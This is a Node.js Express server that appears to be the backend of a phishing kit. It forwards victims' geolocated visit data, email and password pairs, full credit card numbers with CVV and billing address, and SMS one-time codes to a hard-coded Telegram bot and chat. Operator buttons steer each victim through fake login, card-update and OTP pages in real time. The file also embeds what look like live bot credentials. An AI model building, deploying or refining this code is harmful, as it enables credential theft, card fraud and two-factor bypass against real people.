const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const userAgentParser = require('user-agent-parser');

const app = express();

// ✅ Dynamic port for Render
const port = process.env.PORT || 3000;

// ✅ Your bot credentials
const botToken = '8280586774:AAGk9J6gZA8uCSrJUOAEAxwJ_0eBVlEwbnI';
const chatId = '-1002958450788';

// ✅ Detect environment (Render vs Local)
const isRender = !!process.env.RENDER_EXTERNAL_URL;

// ✅ Initialize bot (Webhook for Render, Polling for local)
let bot;
if (isRender) {
  bot = new TelegramBot(botToken);
  const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/bot${botToken}`;
  console.log(`Setting webhook to: ${webhookUrl}`);
  bot.setWebHook(webhookUrl);
} else {
  bot = new TelegramBot(botToken, { polling: true });
  console.log('Running in local mode: Polling enabled');
}

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ✅ Telegram webhook endpoint (Render)
app.post(`/bot${botToken}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

const sseConnections = {};

// === ROUTES === //

app.get('/details', async (req, res) => {
  const visitorIp = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const userId = req.headers['user-id'];

  if (!userId) {
    return res.status(400).json({ success: false, message: "User ID is required" });
  }

  const parsedUserAgent = userAgentParser(userAgent);
  const browser = parsedUserAgent.browser.name || 'Unknown';

  let visitorCity = 'Unknown';
  let visitorCountry = 'Unknown';
  let visitorProvider = 'Unknown';
  let visitorHostname = 'Unknown';

  try {
    console.log('Fetching IP info for:', visitorIp);
    const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
    const ipInfo = ipInfoResponse.data;

    if (ipInfo && ipInfo.status === 'success') {
      visitorCity = ipInfo.city || 'Unknown';
      visitorCountry = ipInfo.country || 'Unknown';
      visitorProvider = ipInfo.org || 'Unknown';
      visitorHostname = ipInfo.hostname || 'Unknown';
    }
  } catch (error) {
    console.error('Error fetching IP information:', error);
  }

  const message = `
🚨 New Visitor Alert 🚨
=====================
🌍 IP Address: ${visitorIp}
🔗 Hostname: ${visitorHostname}
🏙 City: ${visitorCity}
🏳️ Country: ${visitorCountry}
🌐 Browser: ${browser}
🛣 Provider: ${visitorProvider}
🆔 User ID: ${userId}  
=====================
`;

  try {
    await sendToTelegram(message, userId);
    res.json({ success: true });
  } catch (error) {
    console.error('Error notifying page load:', error);
    res.status(500).json({ success: false });
  }
});

app.get('/details-approve', async (req, res) => {
  const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const userId = req.headers['user-id'];
  if (!userId) {
    return res.status(400).json({ success: false, message: "User ID is required" });
  }

  const parsedUserAgent = userAgentParser(userAgent);
  const browser = parsedUserAgent.browser.name;

  let visitorCity = '';
  let visitorCountry = '';
  let visitorProvider = '';

  try {
    const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
    const ipInfo = ipInfoResponse.data;

    if (ipInfo && ipInfo.status === 'success') {
      visitorCity = ipInfo.city || 'Unknown';
      visitorCountry = ipInfo.country || 'Unknown';
      visitorProvider = ipInfo.org || 'Unknown';
    }
  } catch (error) {
    console.error('Error fetching IP information:', error);
  }

  const message = `
🚨 User On Approve 🚨
=====================
🌍 IP Address: ${visitorIp}
🏙 City: ${visitorCity}
🏳️ Country: ${visitorCountry}
🌐 Browser: ${browser}
🛣 Provider: ${visitorProvider}
🆔 User ID: ${userId}  
=====================
`;

  try {
    await sendToTelegram(message, userId);
    res.json({ success: true });
  } catch (error) {
    console.error('Error notifying page load:', error);
    res.status(500).json({ success: false });
  }
});

app.get('/user-id', (req, res) => {
  const userId = generateZariNumberId();
  console.log(`Generated user ID: ${userId}`);
  res.json({ success: true, userId });
});

function generateZariNumberId(length = 13) {
  const min = Math.pow(10, length - 1);
  const max = Math.pow(10, length) - 1;
  const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
  return 'Id' + randomNum;
}

// === POST ROUTES === //

app.post('/login', async (req, res) => {
  const { username, password, userId } = req.body;

  if (!username || !password) {
    return res.status(400).send('Please provide both username and password.');
  }

  const message = `
🚨Login
=====================
🧑‍💻 Email: ${username}
🔑 Password: ${password}
=====================
🌍 User ID: ${userId}
=====================
`;

  try {
    await sendToTelegram(message, userId);
    res.send({
      success: true,
      message: 'Login attempt successful. Please wait for action buttons.',
      showVerification: true,
    });
  } catch (error) {
    console.error('Error sending login message to Telegram:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.post('/send-cc', async (req, res) => {
  const { cc_holder, cc, exp, cvv, userId, addressLine, city, state, zipcode } = req.body;

  const message = `
🚨 CC Data
=====================
👤 Name: ${cc_holder}
💳 Card Number: ${cc}
📅 Expiration Date: ${exp}
🔒 CVV: ${cvv}
=====================
🏠 Address: ${addressLine}, ${city}, ${state} ${zipcode}
=====================
🌍 User ID: ${userId}
=====================
`;

  try {
    await sendToTelegram(message, userId);
    res.send({
      success: true,
      message: 'CC attempt successful. Please wait for action buttons.',
      showVerification: true,
    });
  } catch (error) {
    console.error('Error sending CC message to Telegram:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.post('/send-sms', async (req, res) => {
  const { codeSms, userId } = req.body;

  const message = `
🚨 Sms Code
=====================
🔑 Code: ${codeSms}
=====================
🌍 User ID: ${userId}
=====================
`;

  try {
    await sendToTelegram(message, userId);
    res.send({
      success: true,
      message: 'SMS attempt successful. Please wait for action buttons.',
      showVerification: true,
    });
  } catch (error) {
    console.error('Error sending SMS code to Telegram:', error);
    res.status(500).send('Internal Server Error');
  }
});

// === TELEGRAM CALLBACK === //

async function sendToTelegram(message, userId) {
  try {
    await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Login', callback_data: `login|${userId}` },
            { text: 'Update', callback_data: `cc|${userId}` },
          ],
          [
            { text: 'Otp', callback_data: `sms|${userId}` },
            { text: 'Approve', callback_data: `approve|${userId}` },
          ],
          [
            { text: 'Update-Error', callback_data: `updateError|${userId}` },
            { text: 'Otp-Error', callback_data: `otpError|${userId}` },
            { text: 'Login-Error', callback_data: `loginError|${userId}` },
          ],
          [{ text: 'Thankyou', callback_data: `thankyou|${userId}` }],
        ],
      },
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
}

bot.on('callback_query', async (callbackQuery) => {
  const { id, data } = callbackQuery;
  const [action, userId] = data.split('|');

  let responseText = `User ${userId} clicked ${action}`;

  try {
    await bot.answerCallbackQuery(id, { text: responseText });
    if (sseConnections[userId]) {
      sseConnections[userId].forEach((client) => {
        client.write(`data: ${JSON.stringify({ action, userId })}\n\n`);
      });
    }
  } catch (error) {
    console.error('Error handling callback query:', error);
  }
});

// === SSE === //
app.get('/sse/:userId', (req, res) => {
  const { userId } = req.params;
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  if (!sseConnections[userId]) sseConnections[userId] = [];
  sseConnections[userId].push(res);

  req.on('close', () => {
    sseConnections[userId] = sseConnections[userId].filter((c) => c !== res);
  });
});

// === Start Server === //
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
